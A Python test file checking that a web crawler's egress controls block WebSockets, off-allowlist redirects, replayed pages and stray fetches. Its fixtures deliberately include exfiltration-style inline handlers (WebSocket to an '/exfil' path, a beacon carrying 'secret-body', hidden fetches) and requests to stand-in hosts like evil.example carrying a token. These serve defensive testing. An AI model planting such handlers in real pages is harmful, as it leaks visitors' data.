"""Egress and containment (D28; cases 1, 18): every test here is about something that must *not* leave the
crawler, and the proof is a real socket or a real HTTP server that must stay silent.

Regression tests for the wave-1 review of the crawl module:
  - a blocked WebSocket used to deadlock the crawl (ws.close() inside the handler);
  - a redirect hop from an allowlisted origin to a forbidden one was followed without being checked;
  - offline replay of a recording ran its inline handlers (sockets, beacons) with JavaScript enabled;
  - the robots/shell GETs followed redirects off the allowlist;
  - a page that spins on the main thread blocked past wall_clock_s.
"""

from __future__ import annotations

import json
import sys
import time
from pathlib import Path

sys.path.insert(0, str(Path(__file__).parent / "fixtures" / "crawl"))
import crawl_helpers as h

from blastradius.crawl import explorer as explorer_module
from blastradius.crawl.explorer import Explorer, run_crawl
from blastradius.crawl.policy import HeuristicPolicy


# -------------------------------------------------------------------------------- WebSocket (MAJOR 1)
def test_a_blocked_websocket_neither_deadlocks_nor_connects_and_an_allowed_one_does(tmp_path: Path):
    blocked, server = h.Listener(), h.WsServer()
    try:
        out = h.run_isolated(
            "crawl_scenarios",
            "websockets",
            {"blocked_port": blocked.port, "ws_port": server.port, "tmp": str(tmp_path)},
            timeout=90,
        )
    finally:
        blocked.close()
        server.close()
    assert out["stop_reason"] in ("frontier_empty", "action_budget"), out["error"]
    assert blocked.hits == []  # the forbidden socket never reached its listener
    assert out["stats"]["egress_blocked"].get("127.0.0.1", 0) >= 1
    connected = out["stats"]["counts"]["websockets_connected"]
    assert connected >= 1 and server.upgrades == connected  # the allowlisted one completed its handshake
    assert "/allowed-open" in out["hits"]  # (a mocked socket looks open to its page; it reaches nothing)


# ------------------------------------------------------------------- redirect hops (MAJOR 2)
def _redirect_origin(leak: h.Listener) -> h.LocalServer:
    page = (
        b"<html><head><title>Redirect probe</title></head><body><button>One</button><button>Two</button>"
        b"<button>Three</button><script>"
        b"fetch('/redir-name').catch(()=>{}); fetch('/redir-ip').catch(()=>{});"
        b"</script></body></html>"
    )
    return h.LocalServer(
        {
            "/": (200, {"content-type": "text/html"}, page),
            "/redir-name": (302, {"location": "http://leak.test/leak"}, b""),
            "/redir-ip": (302, {"location": f"http://127.0.0.1:{leak.port}/leak"}, b""),
        }
    )


def _open_browser(ex: Explorer, mapping: dict[str, int]):
    pw = h.mapped_playwright(mapping)()
    handle = pw.__enter__()
    ex._open(handle)
    return pw


def test_a_redirect_from_an_allowlisted_origin_to_a_forbidden_one_reaches_nothing(tmp_path: Path):
    leak = h.Listener()
    origin = _redirect_origin(leak)
    cfg = h.make_cfg(
        base_url="http://app.test",
        seed_urls=["http://app.test/"],
        anchor={"min_interactive": 1},
        deny_url_patterns=[],
    )
    run = h.make_run(tmp_path, "redirect")
    ex = Explorer(
        run, cfg, HeuristicPolicy(), site=lambda url: None, robots_txt=h.ROBOTS_OK, max_actions=2
    )
    pw = _open_browser(ex, {"app.test": origin.port, "leak.test": leak.port})
    blackhole = getattr(ex, "blackhole", None)
    try:
        ex.page.goto("http://app.test/", wait_until="domcontentloaded", timeout=15000)
        ex.page.wait_for_timeout(2500)  # the two fetches and both 302 hops have happened by now
        assert "/redir-name" in origin.paths and "/redir-ip" in origin.paths  # the first hops were allowed
        refused = blackhole.refused if blackhole is not None else {}
    finally:
        ex.context.close()
        ex.browser.close()
        pw.__exit__(None, None, None)
        if blackhole is not None:
            blackhole.close()
        origin.close()
    assert leak.hits == [], f"the second hop reached its target: {leak.hits}"
    assert {"leak.test", "127.0.0.1"} <= set(refused)  # refused at the network layer, and counted
    assert set(ex.redirects_refused) == {"leak.test", "127.0.0.1"}  # attributed from the 302 itself
    leak.close()


def test_a_whole_crawl_over_a_redirecting_origin_counts_the_refused_hops(tmp_path: Path, monkeypatch):
    leak = h.Listener()
    origin = _redirect_origin(leak)
    mapped = h.mapped_playwright({"app.test": origin.port, "leak.test": leak.port})
    monkeypatch.setattr(explorer_module, "sync_playwright", mapped)
    cfg = h.make_cfg(
        base_url="http://app.test",
        seed_urls=["http://app.test/"],
        anchor={"min_interactive": 1},
        max_depth=1,
    )
    try:
        r = h.crawl_once(tmp_path, site=lambda url: None, cfg=cfg, max_actions=4)  # type: ignore[arg-type]
    finally:
        origin.close()
    assert leak.hits == []
    assert r.summary.egress_blocked >= 2
    assert {"leak.test", "127.0.0.1"} <= set(r.stats["egress_blocked_network"])
    leak.close()


# --------------------------------------------------------------- offline replay (MAJOR 3)
RECORDED_PAGE = """<!doctype html><html><head><title>Hoppscotch • recorded</title></head>
<body onload="new WebSocket('ws://127.0.0.1:{port}/onload')">
<img src="x" onerror="try{{new WebSocket('ws://127.0.0.1:{port}/exfil')}}catch(e){{}};
  try{{navigator.sendBeacon('http://127.0.0.1:{port}/beacon','secret-body')}}catch(e){{}};
  try{{fetch('http://127.0.0.1:{port}/fetch',{{mode:'no-cors'}})}}catch(e){{}}">
<svg onload="fetch('http://127.0.0.1:{port}/svg',{{mode:'no-cors'}})"></svg>
<button>One</button><button>Two</button><button>Three</button><button>Four</button>
<a href="/a">Five</a><a href="/b">Six</a><button>Seven</button><button>Eight</button>
<script>fetch('http://127.0.0.1:{port}/script',{{mode:'no-cors'}})</script>
</body></html>"""


def _recording(tmp_path: Path, port: int, states: int = 3) -> Path:
    folder = tmp_path / "recording"
    folder.mkdir()
    for i in range(1, states + 1):
        (folder / f"{i:03d}.html").write_text(RECORDED_PAGE.format(port=port) + f"<!-- state {i} -->")
        meta = {"url": f"https://hoppscotch.io/s{i}", "status": 200, "title": "Hoppscotch • recorded"}
        (folder / f"{i:03d}.json").write_text(json.dumps(meta))
    return folder


def test_offline_replay_of_a_recording_reaches_nothing(tmp_path: Path):
    listener = h.Listener()
    run = h.make_run(tmp_path, "replay")
    try:
        summary = run_crawl(
            run, h.hoppscotch_cfg(), None, source="recorded", recorded_dir=_recording(tmp_path, listener.port)
        )
        time.sleep(1.0)  # a late beacon would have landed by now
    finally:
        listener.close()
    assert listener.hits == [], f"the recording made the crawler reach out: {listener.hits}"
    assert summary.screens >= 1 and summary.actions_spent == 0


def test_the_persisted_copy_of_a_recording_is_inert_and_run_relative(tmp_path: Path):
    run = h.make_run(tmp_path, "inert")
    folder = _recording(tmp_path, 9)
    run_crawl(run, h.hoppscotch_cfg(), None, source="recorded", recorded_dir=folder)
    shots = h.read_jsonl(run.run_dir / "crawl" / "screens.jsonl")
    assert shots and all(s["dom_path"].startswith("crawl/dom/") for s in shots)
    blob = "".join((run.run_dir / s["dom_path"]).read_text() for s in shots)
    assert "onerror" not in blob and "onload" not in blob and "<script" not in blob
    assert str(folder) not in (run.run_dir / "crawl" / "captures.jsonl").read_text()
    assert str(tmp_path / "recording") not in (run.run_dir / "crawl" / "screens.jsonl").read_text()


# ---------------------------------------------------------------- plain GETs (MINOR: redirects)
def _cfg_for(origin: h.LocalServer):
    return h.make_cfg(base_url=origin.origin, seed_urls=[origin.origin + "/"], egress_allow=["app.test"])


def test_robots_and_shell_fetches_do_not_follow_a_redirect_off_the_origin(tmp_path: Path):
    other = h.Listener()
    origin = h.LocalServer(
        {
            "/robots.txt": (302, {"location": f"http://127.0.0.1:{other.port}/robots.txt"}, b""),
            "/": (302, {"location": f"http://127.0.0.1:{other.port}/shell"}, b""),
        }
    )
    ex = Explorer(h.make_run(tmp_path, "robots"), _cfg_for(origin), HeuristicPolicy())
    try:
        assert ex._fetch_robots() is None  # unreadable = deny (case 69)
        assert ex.robots_state.startswith("unreadable")
        assert ex._shell_html() is None
    finally:
        origin.close()
        other.close()
    assert other.hits == []


def test_a_redirect_that_stays_on_the_origin_is_followed(tmp_path: Path):
    origin = h.LocalServer(
        {
            "/robots.txt": (301, {"location": "/policy.txt"}, b""),
            "/policy.txt": (200, {"content-type": "text/plain"}, b"User-agent: *\nDisallow: /nope\n"),
        }
    )
    ex = Explorer(h.make_run(tmp_path, "robots-ok"), _cfg_for(origin), HeuristicPolicy())
    try:
        assert "Disallow: /nope" in (ex._fetch_robots() or "")
    finally:
        origin.close()


# ------------------------------------------------------------------------------------ netguard
def test_blackhole_counts_hosts_and_never_answers():
    import socket

    from blastradius.crawl.netguard import Blackhole

    bh = Blackhole()
    try:
        requests = (
            b"CONNECT evil.example:443 HTTP/1.1\r\n\r\n",
            b"GET http://other.test/p?token=s3cret HTTP/1.1\r\n\r\n",
        )
        for line in requests:
            with socket.create_connection(("127.0.0.1", bh.port), timeout=3) as c:
                c.sendall(line)
                assert c.recv(64) == b""  # closed without a response
        time.sleep(0.3)
        assert bh.refused == {"evil.example": 1, "other.test": 1}  # hosts only: no path, no query
    finally:
        bh.close()


def test_bypass_list_proxies_loopback_and_names_only_public_allowlisted_hosts():
    from blastradius.crawl.netguard import bypass_list

    allow = ["hoppscotch.io", "echo.hoppscotch.io", "127.0.0.1", "localhost", "bad host"]
    rules = bypass_list(allow).split(",")
    assert rules[0] == "<-loopback>"
    expected = {"hoppscotch.io:443", "hoppscotch.io:80", "*.hoppscotch.io:443", "echo.hoppscotch.io:443"}
    assert expected <= set(rules)
    assert not any("127.0.0.1" in r or "localhost" in r or "bad" in r for r in rules)
    assert bypass_list([]) == "<-loopback>"


def test_hop_rule_is_same_origin_or_allowlisted_and_public():
    from blastradius.crawl.netguard import hop_allowed

    allow = ["hoppscotch.io"]
    assert hop_allowed("https://hoppscotch.io/x", "https://hoppscotch.io", allow)
    assert hop_allowed("https://www.hoppscotch.io/x", "https://hoppscotch.io", allow)
    assert hop_allowed("http://127.0.0.1:9/ok", "http://127.0.0.1:9", allow)  # the configured origin itself
    assert not hop_allowed("http://127.0.0.1:10/x", "http://127.0.0.1:9", allow)
    assert not hop_allowed("https://evil.example/", "https://hoppscotch.io", allow)
    assert not hop_allowed("https://hoppscotch.io:9119/", "https://hoppscotch.io", allow)


def test_fetch_checked_reports_a_refused_hop_without_following_it():
    from blastradius.crawl.netguard import fetch_checked

    other = h.Listener()
    origin = h.LocalServer({"/": (302, {"location": f"http://127.0.0.1:{other.port}/"}, b"")})
    try:
        got = fetch_checked(origin.origin + "/", base_url=origin.origin, allow=[], user_agent="t/1")
    finally:
        origin.close()
        other.close()
    assert got.error == "redirect refused" and got.refused_host == "127.0.0.1" and other.hits == []


# --------------------------------------------------------------------------------- the watchdog
def test_a_page_that_spins_the_main_thread_cannot_hang_the_crawl_past_its_deadline(tmp_path: Path):
    out = h.run_isolated("crawl_scenarios", "spinner", {"tmp": str(tmp_path)}, timeout=120)
    assert out["stop_reason"] == "time_budget"
    assert "watchdog" in (out["error"] or "")
    assert out["elapsed"] < 60
